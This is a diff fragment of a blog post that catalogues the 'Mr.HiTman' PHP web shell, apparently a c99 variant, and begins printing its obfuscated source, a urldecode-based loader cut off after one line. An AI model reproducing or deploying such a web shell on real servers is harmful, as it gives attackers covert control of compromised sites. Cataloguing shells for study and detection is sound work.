@@ -14,6 +14,7 @@ tags:
 ---
 Mr.HiTman&#8217;s shell is an encrypted PHP script &#8211; probably c99 or a variation of it.
 
+
 ### Mr.HiTman Shell Script (encrypted) Source Code
 
 {% highlight php %}<?php /* Mr.HiTman */$OOO000000=urldecode('%66%67%36%73%62%65%68%70%72%61%34%63
